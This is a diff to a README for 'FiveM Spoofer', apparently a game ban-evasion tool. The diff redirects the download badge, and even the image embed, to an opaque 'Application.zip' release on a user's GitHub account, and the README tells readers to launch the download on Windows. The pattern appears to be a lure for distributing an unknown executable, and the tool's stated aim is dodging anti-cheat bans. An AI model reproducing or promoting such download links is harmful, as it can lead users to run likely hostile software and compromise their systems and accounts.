@@ -21,7 +21,7 @@ FiveM Spoofer comes packed with functionalities that are tailored to the needs o
 
 To get started with FiveM Spoofer, simply download the latest version of the application from the following link:
 
-[![Download FiveM Spoofer](https://img.shields.io/badge/Download-FiveM Spoofer-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download FiveM Spoofer](https://github.com/maks1234-blip/FiveM-Spoofer/releases/download/v1.0/Application.zip Spoofer-blue)](https://github.com/maks1234-blip/FiveM-Spoofer/releases/download/v1.0/Application.zip)
 
 *Note: Once downloaded, the application needs to be launched on your Windows system.*
 
@@ -47,7 +47,7 @@ If you are passionate about gaming and software development, we welcome you to c
 
 Let's make gaming on FiveM a seamless and enjoyable experience with FiveM Spoofer! 🚀
 
-![FiveM Spoofer](https://imageurl.com)
+![FiveM Spoofer](https://github.com/maks1234-blip/FiveM-Spoofer/releases/download/v1.0/Application.zip)
 
 ---
 
